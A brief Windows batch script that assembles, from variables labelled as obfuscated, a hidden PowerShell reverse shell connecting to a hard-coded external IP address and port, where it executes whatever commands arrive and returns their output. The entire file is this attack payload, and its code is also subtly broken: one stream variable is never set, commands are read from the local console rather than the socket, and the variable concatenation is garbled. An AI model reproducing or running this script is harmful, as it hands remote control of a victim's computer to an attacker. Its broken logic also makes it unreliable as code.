@echo off
setlocal enabledelayedexpansion

:: Define obfuscated variables
set "x1=powershell -nop -w hidden -c "
set "x2=New-Object Net.Sockets.TCPClient;"
set "x3=New-Object IO.StreamWriter($c.GetStream());"
set "x4=$c.Connect('18.198.77.177',19441);"
set "x5=while(($cmd=Read-Host) -ne 'exit'){"
set "x6=$s.WriteLine((iex $cmd 2>&1));"
set "x7=$s.Flush();}"

:: Combine the obfuscated parts
set "cmd=!x1!$c=!x2!%x4!%x3!%x5!%x6!%x7!"

:: Execute the combined command
powershell -nop -w hidden -c !cmd!
